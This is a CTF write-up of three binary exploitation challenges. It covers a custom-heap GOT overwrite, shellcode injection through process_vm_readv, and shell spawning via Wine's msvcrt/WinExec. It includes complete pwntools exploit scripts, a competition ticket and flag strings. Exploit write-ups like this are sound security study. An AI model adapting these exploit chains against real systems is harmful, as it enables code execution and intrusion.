{
  void *s; // [rsp+28h] [rbp-8h]

  if ( (char *)top + a1 >= (char *)&top )
    __assert_fail("block_end < heap_end", "main.c", 0x44u, "galloc");
  s = top;
  top = (char *)top + a1;
  memset(s, 0, a1);
  return s;
}
```

It's also make a custom `sus_file` structure and a custom `do_open` function

```c
struct susfile {
    void (*read_line)(void*);
    char* filename;
    char* buffer;
    uint8_t fd;
    uint8_t _padding0;
    uint16_t buf_size;
    uint16_t buf_cap;
    uint16_t __padding1;
    void (*reset)(void*);
    void (*open_hook)(void*);
};
```

`do_open` first allocates the `susfile` struct, calls to `sys_open`, reads from that file, and exits either the content has `sus` string or not

```c
susfile *__fastcall sus_open(char *a1, int a2)
{
  susfile *v3; // [rsp+18h] [rbp-28h]
  char *dest; // [rsp+20h] [rbp-20h]
  size_t n; // [rsp+28h] [rbp-18h]
  susfile *v6; // [rsp+30h] [rbp-10h]
  char *buffer; // [rsp+38h] [rbp-8h]

  sysnum_ = 2;
  v3 = (susfile *)galloc(48uLL);
  dest = (char *)galloc(16uLL);
  v3->filename = dest;
  v3->open_hook = (void (__fastcall *)(void *))open_hook;
  v3->read_line = (void (__fastcall *)(void *))read_file;
  v3->reset = (void (__fastcall *)(void *))reset;
  n = strlen(a1);
  strncpy(dest, a1, n);
  v6 = check;
  if ( (flags & 0xFFFC) == 0 )
    __assert_fail("flags > 0", "main.c", 0xBDu, "do_open");
  if ( !mode )
    __assert_fail("mode > 0", "main.c", 0xBEu, "do_open");
  v3->fd = syscall((unsigned __int8)sysnum_, dest, (unsigned __int16)flags & 0xFFFC, (unsigned __int8)mode);
  v3->buffer = (char *)galloc(0x10uLL);
  v3->buf_size = 0;
  v3->buf_cap = 16;
  if ( v6 )
  {
    v6->open_hook(a1);
    if ( !a2 )
    {
      printf("Not sus: %s\n", a1);
      exit(0);
    }
    v6->reset(v6);
    puts("Please decide what to do with this file: sus/not");
    v6->read_line(v6);
    buffer = v6->buffer;
    if ( *buffer == 's' && buffer[1] == 'u' && buffer[2] == 's' )
    {
      printf("SUS ALERT!!!: %s!!!\n", a1);
      unlink(a1);
      exit(1);
    }
    printf("Not sus: %s\n", a1);
    exit(0);
  }
  return v3;
}
```


Go to the main function, it starts by opening the file `/proc/self/fd/0`, and then the `buffer` we enter will be passed to the `sus_open` function if it has the `sus` prefix. If not, it will reset the `cap_size` to the 0x10 size, and perform a re-reading from the beginning


## Bug

In the `read_file` function, it's called `regalloc` if the size is larger than the cap size, if our input has a null byte or newline, it stops reading and resets to read again.

```c
char *__fastcall read_file(susfile *a1)
{
  char *result; // rax
  unsigned int fd; // [rsp+10h] [rbp-10h]
  char *v3; // [rsp+18h] [rbp-8h]

  fd = a1->fd;
  reset(a1);
  while ( 1 )
  {
    if ( a1->buf_size >= a1->buf_cap )
      resize(a1, a1->buf_cap + 256);
    if ( a1->buf_size >= a1->buf_cap )
      __assert_fail("fileinfo->buf_size < fileinfo->buf_cap", "main.c", 0x10Bu, "susfile_read_in");
    v3 = susfile_get_buffer_end(a1);
    if ( (unsigned int)syscall(0LL, fd, v3, 1LL) != 1 )
      __assert_fail("res == 1", "main.c", 0x10Fu, "susfile_read_in");
    if ( *v3 == '\n' || !*v3 )
      break;
    ++a1->buf_size;
  }
  result = v3;
  *v3 = 0;
  return result;
}
```

So, if the buffer equal to top_ptr, it updates the top_ptr without checking the 'pointer' has exceeded the bound.

```c
if ( &a1[a2] == top )
  {
    top = &a1[a3];
    return a1;
  }
```


## Solution

I trigger the bug to overwrite the top_ptr to `strlen_got`

![image](https://imgur.com/WexYRIR.png)

My idea is to overwrite the memset function with the `puts` function, and the `top_ptr` now points to the `alarm_got`.


![image](https://imgur.com/OFrcqS9.png)

So, the next `galloc` will print our gift =))

![image](https://imgur.com/1f6zxoU.png)

The custom heap struct is beneath the GOT region, so I easily overwrite the `readline` function pointer with my one_gadget. Fortunately, there is 1 that satisfies the condition.

![image](https://imgur.com/TbG73to.png)

## Solve script

`solve.py`
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = './sus?'

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return process([exe] + argv, *a, **kw)
    if args.REMOTE:
        return remote("suscall.shellweplayaga.me", 505)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

elf = context.binary = ELF("./sus?")
io = start()
ticket = b'ticket{NiceDialup3334n24:Dc18ctaSmj_o6ck0WAO2-q7wSmUJ4w8-y719xXeqNBNGyC6t}'
if args.GDB:
    cmd="""
    handle SIGALRM noignore
    b*0x00000000004012E1
    """
    gdb.attach(io, cmd)
    
if args.REMOTE:
    io.sendlineafter(b'Ticket please: ', ticket)
    
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
heap_top = 0x00000000004064A0
heap_base = 0x4040a0
pause()
pl = b'A'*0x1000 + b'\n'
io.send(pl)

pl = b'A'*0x1000 + b'\n'
io.send(pl)

pl = b'A'*928+p32(0x404038) + b'\n'
io.send(pl)
pause()
pl = b'A'*8+p32(elf.plt.puts)

io.send(pl)

io.recvuntil(b'Looking for sus files...\n')

libc.address = u64(io.recv(6)+b'\0\0')  -  0xea540
print(hex(libc.address))
pause()
pl = p64(0xdeadbeef)+b'A'*8+p64(libc.address+0xebc81)+b'\n'
io.send(pl)


io.interactive()

```
+ flag{NiceDialup3334n24:6NhGAXbkoPeDnJtjEPTWpBbsZgIxEsrUL42Fu_0lKpltFBre0gRowaNOS0TTZh9GD1_kGlTw4X5JqdM4mF1g}

# Pwn - process_vm_readv-me-maybe

[Attachment]()

## Source-code overview

In the main function, it's called `fork()`.
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // rcx
  __pid_t v4; // eax
  __int64 v6; // [rsp-8h] [rbp-8h]

  v6 = v3;
  init(argc, argv, envp);
  prctl(1499557217, -1LL, 0LL, 0LL, 0LL);
  v4 = fork();
  if ( v4 )
    return parent(v4);
  else
    return child(1499557217LL, -1LL, v6);
}
```

While the parent provides arbitrary reads and writes of the child's memory, the child installs seccomp, calls `mprotect` to make its code section has all permissions `rwx`, then enters the loop.


## Solution

My idea is to use arbitrary reads and writes in parent processes to write our shellcode to the code section of the child process.

My shellcode makes 3 chains: 
+ Overwrite `stdin pointer` in the `bss()` section of parent to string `/bin/sh`.
+ Overwrite `setbuf_got` with `system`
+ Overwrite `kill_got` with `init+4`

Get shell


```shell
──────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────────────
   0x5d6760e8234d <init+4>     push   rax
   0x5d6760e8234e <init+5>     mov    rdi, qword ptr [rip + 0x223b]     RDI, [stdin@GLIBC_2.2.5] => 0x73e0753d8678 ◂— 0x68732f6e69622f /* '/bin/sh' */
   0x5d6760e82355 <init+12>    xor    ecx, ecx                          ECX => 0
   0x5d6760e82357 <init+14>    mov    edx, 2                            EDX => 2
   0x5d6760e8235c <init+19>    xor    esi, esi                          ESI => 0
 ► 0x5d6760e8235e <init+21>    call   setvbuf@plt                 <setvbuf@plt>
        stream: 0x73e0753d8678 ◂— 0x68732f6e69622f /* '/bin/sh' */
        buf: 0
        modes: 2
        n: 0
```


## Solve script

```python
from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337
if args.LOCAL:
    io = process("./chall")
    if args.GDB:
        cmd = """
        """
        gdb.attach(io, cmd)
else:    
    io = remote(HOST, int(PORT))
        

io.sendlineafter(b'Choice: \n', b'1')
io.sendlineafter(b'Address: \n', b'1')
io.recvuntil(b'Value: ')

context.arch = "amd64"
stack = int(io.recv(12), 16)
print(hex(stack))
ret = stack - 0x110

def readv(addr):
    io.sendlineafter(b'Choice: \n', b'1')
    io.sendlineafter(b'Address: \n', hex(addr).encode())
def writev(addr, value):
    io.sendlineafter(b'Choice: \n', b'2')
    io.sendlineafter(b'Value: \n', hex(value).encode())
    io.sendlineafter(b'Address: \n', hex(addr).encode())

readv(ret)
io.recvuntil(b'Value: ')
libc = int(io.recv(12), 16) - 0x29d90
print(hex(libc))
l = stack - 0x120
readv(l)
io.recvuntil(b'Value: ')
pie = int(io.recv(12), 16) - 0x1484

readv_helper = pie+0x1488
writev_helper = pie+0x14fc

write_ = pie+0x1488+0x100
kk = write_
print(hex(write_))
pl = asm("""
    push 110
    pop rax
    syscall
    mov r10, rax
    mov rdi, rax
    mov rsi, {}
    mov rdx, {}
    mov rcx, {}
    call rcx
""".format(pie+0x3590, libc+0x1d8678, writev_helper))

pl += asm("""
    push 110
    pop rax
    syscall
    mov r10, rax
    mov rdi, rax
    mov rsi, {}
    mov rdx, {}
    mov rcx, {}
    call rcx
""".format(0x3510+pie, libc+0x50d70 , writev_helper))

pl += asm("""
    push 110
    pop rax
    syscall
    mov r10, rax
    mov rdi, rax
    mov rsi, {}
    mov rdx, {}
    mov rcx, {}
    call rcx
""".format(0x3500+pie,pie+0x000000000000134D , writev_helper))

for i in range((len(pl))//8 +1):
    writev(write_+i*8, u64(pl[i*8:(i+1)*8].ljust(8, b'\x90')))

write_ = pie+0x1488
pl = asm("""
    mov rcx, {}
    jmp rcx
""".format(kk))

for i in range((len(pl))//8 +1):
    writev(write_+i*8, u64(pl[i*8:(i+1)*8].ljust(8, b'\x90')))

writev(write_-8, u64(p64(0x9090909090909090)))
sleep(0.1)
io.sendline(b'3')

io.sendline(b'./submitter')
flag = io.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)
```

# Pwn - durnk (winapi)

[Attachment]()

This is the first time I encountered a window executable run based on Wine. So, I will delve into it.

## What is WINE

> Wine (recursive backronym for Wine Is Not an Emulator) is a compatibility layer that aims to allow computer programs (application software and computer games) developed for Microsoft Windows to run on Unix-like operating systems. Wine emulates the Windows runtime environment by translating Windows system calls into POSIX-compliant system calls, recreating the directory structure of Windows systems, and providing alternative implementations of Windows system libraries (from wikipedia).

* Not an emulator that creates a virtual machine in which the Windows application is then executed, but a translation layer between the application and the kernel. This layer creates an environment that makes the application ‘feel’ like it’s running on a Windows system, while in fact it is running on Linux.

## Debug

When you have a wine application running and take a look at the active processes (for example via htop) you will notice that the application is listed as just an other Linux process. This means we can examine it using gdb!

```shell
╭─[nvm] as kyrie in ~/CTF/2024/defcon/durnk/handout                                                                                                           16:41:49
╰──➤ ps aux | grep "challenge"
kyrie      50236  0.0  0.0  67096  7728 pts/1    S+   16:24   0:00 Z:\home\kyrie\CTF\2024\defcon\durnk\handout\challenge.exe
kyrie      53976  0.0  0.0  67096  7980 pts/2    S+   16:38   0:00 Z:\home\kyrie\CTF\2024\defcon\durnk\handout\challenge.exe
kyrie      54639  0.0  0.0  12088  2432 pts/8    S+   16:41   0:00 grep --color=auto --exclude-dir=.bzr --exclude-dir=CVS --exclude-dir=.git --exclude-dir=.hg --exclude-dir=.svn --exclude-dir=.idea --exclude-dir=.tox challenge
```

Wine actually has it’s own debugger, [WineDbg](https://wiki.winehq.org/Wine_Developer%27s_Guide/Debugging_Wine). But I will ignore it and use pwndbg instead =))

I used the following this small C program to explore the memory layout of the WINE process and compile this with this command: 
(make sure we have mingW downloaded)

```shell!
$ x86_64-w64-mingw32-gcc -o test.exe test.c
```

`test.c`
```c
#include <windows.h>
#include <stdio.h>

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
    printf("WinMain:\t\t%p\n",WinMain);

    HMODULE kernel32 = LoadLibrary("kernel32.dll");
    printf("kernel32.dll:\t\t%p\n",kernel32);

    printf("GetProcAddress:\t\t%p\n",GetProcAddress);

    HMODULE msvcrt = LoadLibrary("msvcrt.dll");
    printf("msvcrt.dll:\t\t%p\n",msvcrt);    

    HMODULE ntdll = LoadLibrary("ntdll.dll");
    printf("ntdll.dll:\t\t%p\n",ntdll);

    int dummy;
    printf("Stack:\t\t\t%p\n",&dummy);

    void *heap = malloc(128);
    printf("Heap:\t\t\t%p\n",heap);

    getchar();

    return 0;
}
```


Run this test through Wine

```shell
$ wine test.exe 
```

In another terminal, type this command:

```shell
gdb -p $(pgrep -f test.exe)
```


Let’s take a closer look at the memory of the test.exe process via gdb’s vmmap command:

```shell
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
             Start                End Perm     Size Offset File
        0x7bb50000         0x7bb51000 r--p     1000      0 /opt/wine-stable/lib64/wine/x86_64-windows/msvcrt.dll
        0x7bb51000         0x7bbc0000 r-xp    6f000   1000 /opt/wine-stable/lib64/wine/x86_64-windows/msvcrt.dll
        0x7bbc0000         0x7bbc4000 rw-p     4000  70000 /opt/wine-stable/lib64/wine/x86_64-windows/msvcrt.dll
        0x7bbc4000         0x7bbdf000 r--p    1b000  74000 /opt/wine-stable/lib64/wine/x86_64-windows/msvcrt.dll
        0x7bbdf000         0x7bbe1000 rw-p     2000      0 [anon_7bbdf]
        0x7bbe1000         0x7bbe8000 r--p     7000  8f000 /opt/wine-stable/lib64/wine/x86_64-windows/msvcrt.dll
        0x7bbe8000         0x7bbeb000 rw-p     3000  96000 /opt/wine-stable/lib64/wine/x86_64-windows/msvcrt.dll
        0x7bbeb000         0x7bea6000 r--p   2bb000  99000 /opt/wine-stable/lib64/wine/x86_64-windows/msvcrt.dll
        0x7fde0000         0x7ffc0000 ---p   1e0000      0 [anon_7fde0]
        0x7ffc0000         0x7ffe0000 rw-p    20000      0 [anon_7ffc0]
        0x7ffe0000         0x7ffe1000 r--p     1000      0 /tmp/.wine-1000/server-803-72295/tmpmap-6be2772d (deleted)
        0x7ffe1000         0x7ffe2000 rw-p     1000      0 [anon_7ffe1]
        0x7ffe2000         0x7fff0000 ---p     e000      0 [anon_7ffe2]
       0x140000000        0x140001000 r--p     1000      0 /home/kyrie/CTF/2024/defcon/durnk/handout/test.exe
       0x140001000        0x140008000 r-xp     7000      0 [anon_140001]
       0x140008000        0x140009000 rw-p     1000      0 [anon_140008]
       0x140009000        0x14000c000 r--p     3000      0 [anon_140009]
       0x14000c000        0x14000d000 rw-p     1000      0 [anon_14000c]
       0x14000d000        0x14000e000 rw-p     1000   9000 /home/kyrie/CTF/2024/defcon/durnk/handout/test.exe
       0x14000e000        0x140010000 rw-p     2000      0 [anon_14000e]
       0x140010000        0x14007e000 r--p    6e000      0 [anon_140010]
    0x5555562bb000     0x5555562dc000 rw-p    21000      0 [heap]
    0x6fffff440000     0x6fffff441000 r--p     1000      0 /opt/wine-stable/lib64/wine/x86_64-windows/kernelbase.dll
    0x6fffff441000     0x6fffff4cd000 r-xp    8c000   1000 /opt/wine-stable/lib64/wine/x86_64-windows/kernelbase.dll
    0x6fffff4cd000     0x6fffff4d1000 rw-p     4000  8d000 /opt/wine-stable/lib64/wine/x86_64-windows/kernelbase.dll
    0x6fffff4d1000     0x6fffff4f8000 r--p    27000  91000 /opt/wine-stable/lib64/wine/x86_64-windows/kernelbase.dll
    0x6fffff4f8000     0x6fffff4fb000 rw-p     3000      0 [anon_6fffff4f8]
    0x6fffff4fb000     0x6fffff506000 r--p     b000  b8000 /opt/wine-stable/lib64/wine/x86_64-windows/kernelbase.dll
    0x6fffff506000     0x6fffff6d7000 rw-p   1d1000  c3000 /opt/wine-stable/lib64/wine/x86_64-windows/kernelbase.dll
    0x6fffff6d7000     0x6fffffa68000 r--p   391000 294000 /opt/wine-stable/lib64/wine/x86_64-windows/kernelbase.dll
    0x6fffffa80000     0x6fffffa81000 r--p     1000      0 /opt/wine-stable/lib64/wine/x86_64-windows/kernel32.dll
    0x6fffffa81000     0x6fffffab2000 r-xp    31000   1000 /opt/wine-stable/lib64/wine/x86_64-windows/kernel32.dll
    0x6fffffab2000     0x6fffffab5000 rw-p     3000  32000 /opt/wine-stable/lib64/wine/x86_64-windows/kernel32.dll
    0x6fffffab5000     0x6fffffac3000 r--p     e000  35000 /opt/wine-stable/lib64/wine/x86_64-windows/kernel32.dll
    0x6fffffac3000     0x6fffffac4000 rw-p     1000      0 [anon_6fffffac3]
    0x6fffffac4000     0x6fffffacf000 r--p     b000  43000 /opt/wine-stable/lib64/wine/x86_64-windows/kernel32.dll
    0x6fffffacf000     0x6fffffae2000 rw-p    13000  4e000 /opt/wine-stable/lib64/wine/x86_64-windows/kernel32.dll
    0x6fffffae2000     0x6fffffc39000 r--p   157000  61000 /opt/wine-stable/lib64/wine/x86_64-windows/kernel32.dll
    0x6fffffc50000     0x6fffffc51000 r--p     1000      0 /opt/wine-stable/lib64/wine/x86_64-windows/ntdll.dll
    0x6fffffc51000     0x6fffffcbe000 r-xp    6d000   1000 /opt/wine-stable/lib64/wine/x86_64-windows/ntdll.dll
    0x6fffffcbe000     0x6fffffcc2000 rw-p     4000  6e000 /opt/wine-stable/lib64/wine/x86_64-windows/ntdll.dll
    0x6fffffcc2000     0x6fffffce5000 r--p    23000  72000 /opt/wine-stable/lib64/wine/x86_64-windows/ntdll.dll
    0x6fffffce5000     0x6fffffce9000 rw-p     4000      0 [anon_6fffffce5]
    0x6fffffce9000     0x6fffffcf4000 r--p     b000  95000 /opt/wine-stable/lib64/wine/x86_64-windows/ntdll.dll
    0x6fffffcf4000     0x6fffffcf6000 rw-p     2000  a0000 /opt/wine-stable/lib64/wine/x86_64-windows/ntdll.dll
    0x6fffffcf6000     0x6ffffffea000 r--p   2f4000  a2000 /opt/wine-stable/lib64/wine/x86_64-windows/ntdll.dll
    0x79971c900000     0x79971cc00000 rw-p   300000      0 [anon_79971c900]
    0x79971cc00000     0x79971d442000 r--p   842000      0 /usr/lib/locale/locale-archive
    0x79971d500000     0x79971d600000 rw-p   100000      0 [anon_79971d500]
    0x79971d600000     0x79971d628000 r--p    28000      0 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x79971d628000     0x79971d7bd000 r-xp   195000  28000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x79971d7bd000     0x79971d815000 r--p    58000 1bd000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x79971d815000     0x79971d816000 ---p     1000 215000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x79971d816000     0x79971d81a000 r--p     4000 215000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x79971d81a000     0x79971d81c000 rw-p     2000 219000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x79971d81c000     0x79971d829000 rw-p     d000      0 [anon_79971d81c]
    0x79971d857000     0x79971d85a000 r--p     3000      0 /usr/lib/x86_64-linux-gnu/liblzma.so.5.2.5
    0x79971d85a000     0x79971d875000 r-xp    1b000   3000 /usr/lib/x86_64-linux-gnu/liblzma.so.5.2.5
    0x79971d875000     0x79971d880000 r--p     b000  1e000 /usr/lib/x86_64-linux-gnu/liblzma.so.5.2.5
    0x79971d880000     0x79971d881000 r--p     1000  28000 /usr/lib/x86_64-linux-gnu/liblzma.so.5.2.5
    0x79971d881000     0x79971d882000 rw-p     1000  29000 /usr/lib/x86_64-linux-gnu/liblzma.so.5.2.5
    0x79971d882000     0x79971d884000 r--p     2000      0 /usr/lib/x86_64-linux-gnu/libunwind.so.8.0.1
    0x79971d884000     0x79971d88e000 r-xp     a000   2000 /usr/lib/x86_64-linux-gnu/libunwind.so.8.0.1
    0x79971d88e000     0x79971d891000 r--p     3000   c000 /usr/lib/x86_64-linux-gnu/libunwind.so.8.0.1
    0x79971d891000     0x79971d892000 r--p     1000   e000 /usr/lib/x86_64-linux-gnu/libunwind.so.8.0.1
    0x79971d892000     0x79971d893000 rw-p     1000   f000 /usr/lib/x86_64-linux-gnu/libunwind.so.8.0.1
    0x79971d893000     0x79971d89d000 rw-p     a000      0 [anon_79971d893]
    0x79971d89d000     0x79971d8a7000 r--p     a000      0 /opt/wine-stable/lib64/wine/x86_64-unix/ntdll.so
    0x79971d8a7000     0x79971d903000 r-xp    5c000   a000 /opt/wine-stable/lib64/wine/x86_64-unix/ntdll.so
    0x79971d903000     0x79971d920000 r--p    1d000  66000 /opt/wine-stable/lib64/wine/x86_64-unix/ntdll.so
    0x79971d920000     0x79971d922000 r--p     2000  82000 /opt/wine-stable/lib64/wine/x86_64-unix/ntdll.so
    0x79971d922000     0x79971d923000 rw-p     1000  84000 /opt/wine-stable/lib64/wine/x86_64-unix/ntdll.so
    0x79971d923000     0x79971d95b000 rw-p    38000      0 [anon_79971d923]
    0x79971d95b000     0x79971d95c000 r--p     1000      0 /usr/lib/x86_64-linux-gnu/libdl.so.2
    0x79971d95c000     0x79971d95d000 r-xp     1000   1000 /usr/lib/x86_64-linux-gnu/libdl.so.2
    0x79971d95d000     0x79971d95e000 r--p     1000   2000 /usr/lib/x86_64-linux-gnu/libdl.so.2
    0x79971d95e000     0x79971d95f000 r--p     1000   2000 /usr/lib/x86_64-linux-gnu/libdl.so.2
    0x79971d95f000     0x79971d960000 rw-p     1000   3000 /usr/lib/x86_64-linux-gnu/libdl.so.2
    0x79971d960000     0x79971d961000 r--p     1000      0 /usr/lib/x86_64-linux-gnu/libpthread.so.0
    0x79971d961000     0x79971d962000 r-xp     1000   1000 /usr/lib/x86_64-linux-gnu/libpthread.so.0
    0x79971d962000     0x79971d963000 r--p     1000   2000 /usr/lib/x86_64-linux-gnu/libpthread.so.0
    0x79971d963000     0x79971d964000 r--p     1000   2000 /usr/lib/x86_64-linux-gnu/libpthread.so.0
    0x79971d964000     0x79971d965000 rw-p     1000   3000 /usr/lib/x86_64-linux-gnu/libpthread.so.0
    0x79971d978000     0x79971d97a000 rw-p     2000      0 [anon_79971d978]
    0x79971d97a000     0x79971d97c000 r--p     2000      0 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x79971d97c000     0x79971d9a6000 r-xp    2a000   2000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x79971d9a6000     0x79971d9b1000 r--p     b000  2c000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x79971d9b1000     0x79971d9b2000 ---p     1000  37000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x79971d9b2000     0x79971d9b4000 r--p     2000  37000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x79971d9b4000     0x79971d9b6000 rw-p     2000  39000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x79971d9b6000     0x79971d9b7000 r--p     1000      0 /opt/wine-stable/bin/wine64
    0x79971d9b7000     0x79971d9b8000 r-xp     1000   1000 /opt/wine-stable/bin/wine64
    0x79971d9b8000     0x79971d9b9000 r--p     1000   2000 /opt/wine-stable/bin/wine64
    0x79971d9b9000     0x79971d9ba000 r--p     1000   2000 /opt/wine-stable/bin/wine64
    0x79971d9ba000     0x79971d9bb000 rw-p     1000   3000 /opt/wine-stable/bin/wine64
    0x79971d9bb000     0x79971d9bc000 r--p     1000      0 /opt/wine-stable/bin/wine64-preloader
    0x79971d9bc000     0x79971d9be000 r-xp     2000   1000 /opt/wine-stable/bin/wine64-preloader
    0x79971d9be000     0x79971d9bf000 r--p     1000   3000 /opt/wine-stable/bin/wine64-preloader
    0x79971d9bf000     0x79971d9c1000 rw-p     2000   3000 /opt/wine-stable/bin/wine64-preloader
    0x7ffc5b674000     0x7ffc5b695000 rw-p    21000      0 [stack]
    0x7ffc5b749000     0x7ffc5b74d000 r--p     4000      0 [vvar]
    0x7ffc5b74d000     0x7ffc5b74f000 r-xp     2000      0 [vdso]
    0x7ffffe000000     0x7ffffe100000 rw-p   100000      0 [anon_7ffffe000]
    0x7ffffe100000     0x7ffffe102000 ---p     2000      0 [anon_7ffffe100]
    0x7ffffe102000     0x7ffffe300000 rw-p   1fe000      0 [anon_7ffffe102]
    0x7ffffe300000     0x7ffffe311000 r--p    11000      0 /opt/wine-stable/lib64/wine/x86_64-windows/apisetschema.dll
    0x7ffffe311000     0x7ffffe320000 ---p     f000      0 [anon_7ffffe311]
    0x7ffffe320000     0x7ffffe33a000 rw-p    1a000      0 [anon_7ffffe320]
    0x7ffffe33a000     0x7ffffe340000 ---p     6000      0 [anon_7ffffe33a]
    0x7ffffe340000     0x7ffffe3fa000 r--p    ba000      0 /opt/wine-stable/share/wine/nls/locale.nls
    0x7ffffe3fa000     0x7ffffe400000 ---p     6000      0 [anon_7ffffe3fa]
    0x7ffffe400000     0x7ffffe402000 r--p     2000      0 /opt/wine-stable/share/wine/nls/l_intl.nls
    0x7ffffe402000     0x7ffffe410000 ---p     e000      0 [anon_7ffffe402]
    0x7ffffe410000     0x7ffffe421000 r--p    11000      0 /opt/wine-stable/share/wine/nls/c_1252.nls
    0x7ffffe421000     0x7ffffe430000 ---p     f000      0 [anon_7ffffe421]
    0x7ffffe430000     0x7ffffe441000 r--p    11000      0 /opt/wine-stable/share/wine/nls/c_437.nls
    0x7ffffe441000     0x7ffffe450000 ---p     f000      0 [anon_7ffffe441]
    0x7ffffe450000     0x7ffffe550000 rw-p   100000      0 [anon_7ffffe450]
    0x7ffffe550000     0x7ffffe889000 r--p   339000      0 /opt/wine-stable/share/wine/nls/sortdefault.nls
    0x7ffffe889000     0x7ffffe890000 ---p     7000      0 [anon_7ffffe889]
    0x7ffffe890000     0x7ffffe89f000 r--p     f000      0 /opt/wine-stable/share/wine/nls/normnfc.nls
    0x7ffffe89f000     0x7ffffe8a0000 ---p     1000      0 [anon_7ffffe89f]
    0x7ffffe8a0000     0x7ffffe8ba000 rw-p    1a000      0 [anon_7ffffe8a0]
    0x7ffffe8ba000     0x7ffffe8c0000 ---p     6000      0 [anon_7ffffe8ba]
    0x7ffffe8c0000     0x7ffffe8d1000 r--p    11000      0 /opt/wine-stable/share/wine/nls/c_20127.nls
    0x7ffffe8d1000     0x7fffffdb0000 ---p  14df000      0 [anon_7ffffe8d1]
    0x7fffffdb0000     0x7fffffff0000 rw-p   240000      0 [anon_7fffffdb0]
0xffffffffff600000 0xffffffffff601000 --xp     1000      0 [vsyscall]
pwndbg> 
```

And here is the output we got:

```shell
╭─[nvm] as kyrie in ~/CTF/2024/defcon/durnk/handout                                                                                                           17:33:31
╰──➤ wine test.exe
WinMain:                00000001400015a1
kernel32.dll:           00006fffffa80000
GetProcAddress:         00006fffffa98a60
msvcrt.dll:             000000007bb50000
ntdll.dll:              00006fffffc50000
Stack:                  00007ffffe2ffe4c
Heap:                   00007ffffe8a0c70
```



There are a few things to notice:

+ No readable/writable/executable (rwx) memory
+ The windows executable (challenge.exe) with its sections is mapped beginning at 0x140000000
+ There are many libraries expected in a standard linux process
+ There are other libraries you do not expect at all on a linux system, like kernel32.dll, ntdll.dll, msvcrt.dll and ntdll.so
+ The Heap and The Stack quite close
+ There is a region marked as stack (at 0x7ffc5b674000), but it’s different from the stack used by the application (the printdata output was 0x7ffffe2ffe4c)
+ Same goes for the heap: gdb sees one at 0x5555562bb000 , but the application uses a different heap beginning at 0x7ffffe8a0c70
```
pwndbg> x/2i 0x7ffff7d147e2
   0x7ffff7d147e2 <__GI___libc_read+18>:        cmp    rax,0xfffffffffffff000
   0x7ffff7d147e8 <__GI___libc_read+24>:        ja     0x7ffff7d14840 <__GI___libc_read+112>
```

The most important thing is that the `__GI___libc_read` function, as we would expect in a regular Linux process waits for some input (via getchar()).

If you restart the process and look at it again, you will see that the all libraries are mapped to different addresses each time, while the addresses of the 'msvcrt.dll' libraries mostly remain the same.

When it call to `LoadLibrary` to get the base address of module `msvcrt.dll` 

```c
    HMODULE msvcrt = LoadLibrary("msvcrt.dll");
    printf("msvcrt.dll:\t\t%p\n",msvcrt);    
```

In gdb, `msvcrt.dll` is passed to `rcx` register while `rax` store the address of `LoadLibrary` function

```
─────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────
   0x7bb74ae6     add    rsp, 0x20     RSP => 0x7ffffe2ffe10 (0x7ffffe2ffdf0 + 0x20)
   0x7bb74aea     pop    r12           R12 => 16
   0x7bb74aec     ret                                <0x14000160e>
    ↓
   0x14000160e    lea    rcx, [rip + 0x7a2e]               RCX => 0x140009043 ◂— 'msvcrt.dll'
   0x140001615    mov    rax, qword ptr [rip + 0xbc10]     RAX, [0x14000d22c] => 0x6fffffa8ea14 ◂— lea rsp, [rsp]
 ► 0x14000161c    call   rax                         <0x6fffffa8ea14>
```

Finally, let's get our hands dirty.

## Source-code overview

![image](https://imgur.com/4rgNU3q.png)

First, it uses the DLL specified by us to call the LoadLibraryA function.

![image](https://imgur.com/PpxMeux.png)


Respond to us with the resulting module handle. Using the API name specified on the client side and the module handle in the result of step 1, call the GetProcAddress function on the server side to get the function address

![image](https://imgur.com/CVlVrYr.png)

Finally, using the 64-bit integer specified by the client side as an argument, the function address of the result of step 2 is called on the server side. Returns the result of the call to the client. 


Note that the distribution file also includes `kernel32.dll` and `msvcrt.dll`.


## Solution

### Method 1

1. I call the malloc function of msvcrt.dll with an appropriate size as an argument to allocate memory and obtain the address.
2. I call the gets function of msvcrt.dll with the address in step 1 as an argument, then enter the command '/bin/bash' =))
3. Call 'WinExec' and pass the address of the string as an argument, and we get a shell.


![image](https://imgur.com/QNOdSBQ.png)

I founded that `/root/.wine/dosdevices/z:` is just a symlink to `/`

![image](https://imgur.com/JAQqaBa.png)

Since the original [WinExec](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec) function is a function that takes two arguments, it seems that an indefinite value will be entered in the second argument uCmdShow in this execution method. However, it may be that the uCmdShow argument is a value that does not affect CUI programs.

![image](https://imgur.com/GAKJAea.png)

### Method 2

In this way, I do the same as above, but instead of calling the WinExec function, I call the system function of the module msvcrt.dll

```python
from pwn import *

HOST = "0"
PORT = 1337
if args.LOCAL:
    io = process(["wine", "challenge.exe"])
else:
    io = remote(HOST, int(PORT))
    
io.sendline(b'msvcrt.dll')
io.sendline(b'malloc')
io.sendline(str(0x100).encode()) 
